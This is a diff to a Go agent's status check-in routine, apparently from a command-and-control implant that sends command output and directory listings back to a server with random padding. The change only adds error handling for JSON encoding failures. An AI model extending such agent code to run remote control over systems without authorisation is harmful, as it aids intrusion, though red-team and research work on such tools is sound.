@@ -1064,7 +1064,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 				}
 				b2 := new(bytes.Buffer)
-				json.NewEncoder(b2).Encode(g)
+				err7 := json.NewEncoder(b2).Encode(g)
+				if err7 != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err7.Error()))
+					}
+					break
+				}
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", stdout))
 				}
@@ -1112,7 +1118,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 				}
 				b2 := new(bytes.Buffer)
-				json.NewEncoder(b2).Encode(g)
+				err8 := json.NewEncoder(b2).Encode(g)
+				if err8 != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err8.Error()))
+					}
+					break
+				}
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", dir))
 				}
